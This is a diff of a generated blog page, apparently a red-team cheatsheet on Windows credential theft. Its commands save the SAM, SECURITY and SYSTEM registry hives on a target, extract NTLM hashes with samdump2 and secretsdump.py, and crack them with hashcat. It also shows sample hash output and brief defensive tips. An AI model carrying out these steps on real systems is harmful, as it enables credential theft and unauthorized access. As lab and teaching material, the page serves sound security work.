@@ -6,9 +6,9 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
-<title>🗃️ Dumping NTLM Hashes via Non-Interactive Shell (Windows) | Gajendra Mahato</title>
+<title>Dumping NTLM Hashes via Non-Interactive Shell (Windows) | Gajendra Mahato</title>
 <meta name="keywords" content="windows, ntlm, hash-dumping, samdump2, secretsdump, impacket, hashcat, red-teaming, post-exploitation, password-cracking, offline-attacks, registry-hive, windows-security, privilege-escalation, active-directory">
-<meta name="description" content="Step 1: 💾 Save Registry Hives (SAM, SECURITY, SYSTEM)
+<meta name="description" content="Step 1: Save Registry Hives (SAM, SECURITY, SYSTEM)
 Run these commands on the target Windows machine:
 reg.exe save hklm\sam sam
 reg.exe save hklm\security security
@@ -18,14 +18,14 @@ These commands save the SAM, SECURITY, and SYSTEM hives as files in the current 
 📂 Copy these files to your attacker machine for offline cracking.
 
 
-🔍 Step 2: Extract Hashes from Saved Files
+Step 2: Extract Hashes from Saved Files
 Two popular tools to extract NTLM hashes:
 Using samdump2:
 samdump2 ./system ./sam
 Using Impacket&rsquo;s secretsdump.py:
 secretsdump.py -sam sam -system system LOCAL
 
-📄 Sample Output Explained
+Sample Output Explained
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
@@ -82,10 +82,10 @@ Extract NT hashes (4th field) and save in hashes.txt:">
 />
 <meta property="og:url" content="http://localhost:1313/posts/tipsandtricks/cheatsheets/dumping_ntlm_hashes_via_non_interactive_shell_and__cracking_it_using_various_tools/">
   <meta property="og:site_name" content="Gajendra Mahato">
-  <meta property="og:title" content="🗃️ Dumping NTLM Hashes via Non-Interactive Shell (Windows)">
-  <meta property="og:description" content="Step 1: 💾 Save Registry Hives (SAM, SECURITY, SYSTEM) Run these commands on the target Windows machine:
-reg.exe save hklm\sam sam reg.exe save hklm\security security reg.exe save hklm\system system These commands save the SAM, SECURITY, and SYSTEM hives as files in the current directory. 📂 Copy these files to your attacker machine for offline cracking. 🔍 Step 2: Extract Hashes from Saved Files Two popular tools to extract NTLM hashes:
-Using samdump2: samdump2 ./system ./sam Using Impacket’s secretsdump.py: secretsdump.py -sam sam -system system LOCAL 📄 Sample Output Explained Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450::: 👤 Username (e.g., Administrator) 🆔 User RID/Group (e.g., 500) 🔐 LM hash (usually empty/disabled) 🗝️ NT hash (this is what you crack) 🛠️ Step 3: Crack NTLM Hashes Extract NT hashes (4th field) and save in hashes.txt:">
+  <meta property="og:title" content="Dumping NTLM Hashes via Non-Interactive Shell (Windows)">
+  <meta property="og:description" content="Step 1: Save Registry Hives (SAM, SECURITY, SYSTEM) Run these commands on the target Windows machine:
+reg.exe save hklm\sam sam reg.exe save hklm\security security reg.exe save hklm\system system These commands save the SAM, SECURITY, and SYSTEM hives as files in the current directory. 📂 Copy these files to your attacker machine for offline cracking. Step 2: Extract Hashes from Saved Files Two popular tools to extract NTLM hashes:
+Using samdump2: samdump2 ./system ./sam Using Impacket’s secretsdump.py: secretsdump.py -sam sam -system system LOCAL Sample Output Explained Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450::: 👤 Username (e.g., Administrator) 🆔 User RID/Group (e.g., 500) 🔐 LM hash (usually empty/disabled) 🗝️ NT hash (this is what you crack) 🛠️ Step 3: Crack NTLM Hashes Extract NT hashes (4th field) and save in hashes.txt:">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -98,8 +98,8 @@ Using samdump2: samdump2 ./system ./sam Using Impacket’s secretsdump.py: secre
     <meta property="article:tag" content="Secretsdump">
     <meta property="article:tag" content="Impacket">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="🗃️ Dumping NTLM Hashes via Non-Interactive Shell (Windows)">
-<meta name="twitter:description" content="Step 1: 💾 Save Registry Hives (SAM, SECURITY, SYSTEM)
+<meta name="twitter:title" content="Dumping NTLM Hashes via Non-Interactive Shell (Windows)">
+<meta name="twitter:description" content="Step 1: Save Registry Hives (SAM, SECURITY, SYSTEM)
 Run these commands on the target Windows machine:
 reg.exe save hklm\sam sam
 reg.exe save hklm\security security
@@ -109,14 +109,14 @@ These commands save the SAM, SECURITY, and SYSTEM hives as files in the current 
 📂 Copy these files to your attacker machine for offline cracking.
 
 
-🔍 Step 2: Extract Hashes from Saved Files
+Step 2: Extract Hashes from Saved Files
 Two popular tools to extract NTLM hashes:
 Using samdump2:
 samdump2 ./system ./sam
 Using Impacket&rsquo;s secretsdump.py:
 secretsdump.py -sam sam -system system LOCAL
 
-📄 Sample Output Explained
+Sample Output Explained
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
@@ -157,7 +157,7 @@ Extract NT hashes (4th field) and save in hashes.txt:">
     {
       "@type": "ListItem",
       "position":  4 ,
-      "name": "🗃️ Dumping NTLM Hashes via Non-Interactive Shell (Windows)",
+      "name": "Dumping NTLM Hashes via Non-Interactive Shell (Windows)",
       "item": "http://localhost:1313/posts/tipsandtricks/cheatsheets/dumping_ntlm_hashes_via_non_interactive_shell_and__cracking_it_using_various_tools/"
     }
   ]
@@ -167,14 +167,14 @@ Extract NT hashes (4th field) and save in hashes.txt:">
 {
   "@context": "https://schema.org",
   "@type": "BlogPosting",
-  "headline": "🗃️ Dumping NTLM Hashes via Non-Interactive Shell (Windows)",
-  "name": "🗃️ Dumping NTLM Hashes via Non-Interactive Shell (Windows)",
-  "description": "Step 1: 💾 Save Registry Hives (SAM, SECURITY, SYSTEM) Run these commands on the target Windows machine:\nreg.exe save hklm\\sam sam reg.exe save hklm\\security security reg.exe save hklm\\system system These commands save the SAM, SECURITY, and SYSTEM hives as files in the current directory. 📂 Copy these files to your attacker machine for offline cracking. 🔍 Step 2: Extract Hashes from Saved Files Two popular tools to extract NTLM hashes:\nUsing samdump2: samdump2 ./system ./sam Using Impacket\u0026rsquo;s secretsdump.py: secretsdump.py -sam sam -system system LOCAL 📄 Sample Output Explained Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450::: 👤 Username (e.g., Administrator) 🆔 User RID/Group (e.g., 500) 🔐 LM hash (usually empty/disabled) 🗝️ NT hash (this is what you crack) 🛠️ Step 3: Crack NTLM Hashes Extract NT hashes (4th field) and save in hashes.txt:\n",
+  "headline": "Dumping NTLM Hashes via Non-Interactive Shell (Windows)",
+  "name": "Dumping NTLM Hashes via Non-Interactive Shell (Windows)",
+  "description": "Step 1: Save Registry Hives (SAM, SECURITY, SYSTEM) Run these commands on the target Windows machine:\nreg.exe save hklm\\sam sam reg.exe save hklm\\security security reg.exe save hklm\\system system These commands save the SAM, SECURITY, and SYSTEM hives as files in the current directory. 📂 Copy these files to your attacker machine for offline cracking. Step 2: Extract Hashes from Saved Files Two popular tools to extract NTLM hashes:\nUsing samdump2: samdump2 ./system ./sam Using Impacket\u0026rsquo;s secretsdump.py: secretsdump.py -sam sam -system system LOCAL Sample Output Explained Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450::: 👤 Username (e.g., Administrator) 🆔 User RID/Group (e.g., 500) 🔐 LM hash (usually empty/disabled) 🗝️ NT hash (this is what you crack) 🛠️ Step 3: Crack NTLM Hashes Extract NT hashes (4th field) and save in hashes.txt:\n",
   "keywords": [
     "windows", "ntlm", "hash-dumping", "samdump2", "secretsdump", "impacket", "hashcat", "red-teaming", "post-exploitation", "password-cracking", "offline-attacks", "registry-hive", "windows-security", "privilege-escalation", "active-directory"
   ],
-  "articleBody": "Step 1: 💾 Save Registry Hives (SAM, SECURITY, SYSTEM) Run these commands on the target Windows machine:\nreg.exe save hklm\\sam sam reg.exe save hklm\\security security reg.exe save hklm\\system system These commands save the SAM, SECURITY, and SYSTEM hives as files in the current directory. 📂 Copy these files to your attacker machine for offline cracking. 🔍 Step 2: Extract Hashes from Saved Files Two popular tools to extract NTLM hashes:\nUsing samdump2: samdump2 ./system ./sam Using Impacket’s secretsdump.py: secretsdump.py -sam sam -system system LOCAL 📄 Sample Output Explained Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450::: 👤 Username (e.g., Administrator) 🆔 User RID/Group (e.g., 500) 🔐 LM hash (usually empty/disabled) 🗝️ NT hash (this is what you crack) 🛠️ Step 3: Crack NTLM Hashes Extract NT hashes (4th field) and save in hashes.txt:\n549a1bcb88e35dc18c7a0b0168631411 31d6cfe0d16ae931b73c59d7e0c089c0 30e87bf999828446a1c1209ddde4c450 Crack with Hashcat: hashcat -m 1000 -a 0 hashes.txt wordlist.txt -m 1000: NTLM hash mode -a 0: Dictionary attack mode hashes.txt: file with extracted hashes wordlist.txt: your password list (e.g., rockyou.txt) 🛡️ Defensive Tips 🚫 Disable LM hashes via Group Policy or registry. 🔒 Enforce NTLMv2 and SMB signing. 🔑 Use strong, complex passwords. 👀 Monitor and restrict access to registry hives. ",
-  "wordCount" : "193",
+  "articleBody": "Step 1: Save Registry Hives (SAM, SECURITY, SYSTEM) Run these commands on the target Windows machine:\nreg.exe save hklm\\sam sam reg.exe save hklm\\security security reg.exe save hklm\\system system These commands save the SAM, SECURITY, and SYSTEM hives as files in the current directory. 📂 Copy these files to your attacker machine for offline cracking. Step 2: Extract Hashes from Saved Files Two popular tools to extract NTLM hashes:\nUsing samdump2: samdump2 ./system ./sam Using Impacket’s secretsdump.py: secretsdump.py -sam sam -system system LOCAL Sample Output Explained Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450::: 👤 Username (e.g., Administrator) 🆔 User RID/Group (e.g., 500) 🔐 LM hash (usually empty/disabled) 🗝️ NT hash (this is what you crack) 🛠️ Step 3: Crack NTLM Hashes Extract NT hashes (4th field) and save in hashes.txt:\n549a1bcb88e35dc18c7a0b0168631411 31d6cfe0d16ae931b73c59d7e0c089c0 30e87bf999828446a1c1209ddde4c450 Crack with Hashcat: hashcat -m 1000 -a 0 hashes.txt wordlist.txt -m 1000: NTLM hash mode -a 0: Dictionary attack mode hashes.txt: file with extracted hashes wordlist.txt: your password list (e.g., rockyou.txt) 🛡️ Defensive Tips 🚫 Disable LM hashes via Group Policy or registry. 🔒 Enforce NTLMv2 and SMB signing. 🔑 Use strong, complex passwords. 👀 Monitor and restrict access to registry hives. ",
+  "wordCount" : "190",
   "inLanguage": "en",
   "datePublished": "2026-01-13T00:00:00Z",
   "dateModified": "2026-01-13T00:00:00Z",
@@ -300,13 +300,13 @@ Extract NT hashes (4th field) and save in hashes.txt:">
   <header class="post-header">
     <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/tipsandtricks/">Tips &amp; Tricks</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/tipsandtricks/cheatsheets/">Cheatsheets</a></div>
     <h1 class="post-title entry-hint-parent">
-      🗃️ Dumping NTLM Hashes via Non-Interactive Shell (Windows)
+      Dumping NTLM Hashes via Non-Interactive Shell (Windows)
     </h1>
     <div class="post-meta"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span>
 
 </div>
   </header> 
-  <div class="post-content"><h3 id="step-1--save-registry-hives-sam-security-system">Step 1: 💾 Save Registry Hives (SAM, SECURITY, SYSTEM)<a hidden class="anchor" aria-hidden="true" href="#step-1--save-registry-hives-sam-security-system">#</a></h3>
+  <div class="post-content"><h1 id="step-1-save-registry-hives-sam-security-system">Step 1: Save Registry Hives (SAM, SECURITY, SYSTEM)<a hidden class="anchor" aria-hidden="true" href="#step-1-save-registry-hives-sam-security-system">#</a></h1>
 <p>Run these commands on the target Windows machine:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">reg</span><span class="p">.</span><span class="py">exe</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">sam</span> <span class="n">sam</span>
 </span></span><span class="line"><span class="cl"><span class="n">reg</span><span class="p">.</span><span class="py">exe</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">security</span> <span class="n">security</span>
@@ -316,14 +316,14 @@ Extract NT hashes (4th field) and save in hashes.txt:">
 <li>📂 Copy these files to your attacker machine for offline cracking.</li>
 </ul>
 <hr>
-<h1 id="-step-2-extract-hashes-from-saved-files">🔍 Step 2: Extract Hashes from Saved Files<a hidden class="anchor" aria-hidden="true" href="#-step-2-extract-hashes-from-saved-files">#</a></h1>
+<h1 id="step-2-extract-hashes-from-saved-files">Step 2: Extract Hashes from Saved Files<a hidden class="anchor" aria-hidden="true" href="#step-2-extract-hashes-from-saved-files">#</a></h1>
 <p>Two popular tools to extract NTLM hashes:</p>
 <h3 id="using-samdump2">Using <code>samdump2</code>:<a hidden class="anchor" aria-hidden="true" href="#using-samdump2">#</a></h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">samdump2 ./system ./sam
 </span></span></code></pre></div><h3 id="using-impackets-secretsdumppy">Using Impacket&rsquo;s <code>secretsdump.py</code>:<a hidden class="anchor" aria-hidden="true" href="#using-impackets-secretsdumppy">#</a></h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">secretsdump.py -sam sam -system system LOCAL
 </span></span></code></pre></div><hr>
-<h1 id="-sample-output-explained">📄 Sample Output Explained<a hidden class="anchor" aria-hidden="true" href="#-sample-output-explained">#</a></h1>
+<h1 id="sample-output-explained">Sample Output Explained<a hidden class="anchor" aria-hidden="true" href="#sample-output-explained">#</a></h1>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
 </span></span><span class="line"><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 </span></span><span class="line"><span class="cl">Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
@@ -378,15 +378,15 @@ Extract NT hashes (4th field) and save in hashes.txt:">
       <li><a href="http://localhost:1313/tags/active-directory/">Active-Directory</a></li>
     </ul>
 <nav class="paginav">
-    <a class="prev" href="/posts/tipsandtricks/cheatsheets/perl-rename-tutorial/">
+    <a class="prev" href="/posts/tipsandtricks/cheatsheets/%EF%B8%8F-chisel-port-forwarding-guide/">
         <span class="title">« Prev</span>
         <br>
-        <span>Tutorial: String Manipulation in Perl with s///, y///, and s///g</span>
+        <span>Chisel Port Forwarding Guide</span>
     </a>
-    <a class="next" href="/posts/tipsandtricks/cheatsheets/%EF%B8%8F-chisel-port-forwarding-guide/">
+    <a class="next" href="/posts/tipsandtricks/cheatsheets/ffuf-fuzz-faster-u-fool/">
         <span class="title">Next »</span>
         <br>
-        <span>🛠️ Chisel Port Forwarding Guide</span>
+        <span>FFUF - Fuzz Faster U Fool</span>
     </a>
 </nav>
   </footer>
@@ -419,7 +419,9 @@ Extract NT hashes (4th field) and save in hashes.txt:">
 
     <section>
         <h2>Trending Tags</h2>
-                                                                                                                                                                                    
+              
+        <a class="sidebar-tag" href="http://localhost:1313/tags/overthewire/"> OverTheWire </a>
+                                                                                                                                                                                                                                                            
         <a class="sidebar-tag" href="http://localhost:1313/tags/blog/"> Blog </a>
                                                                                                                                                                    
     </section>
@@ -427,14 +429,6 @@ Extract NT hashes (4th field) and save in hashes.txt:">
     <section id="post-content">
         <h2>Table of Content</h2>
         <nav id="TableOfContents">
-  <ul>
-    <li>
-      <ul>
-        <li><a href="#step-1--save-registry-hives-sam-security-system">Step 1: 💾 Save Registry Hives (SAM, SECURITY, SYSTEM)</a></li>
-      </ul>
-    </li>
-  </ul>
-
   <ul>
     <li>
       <ul>
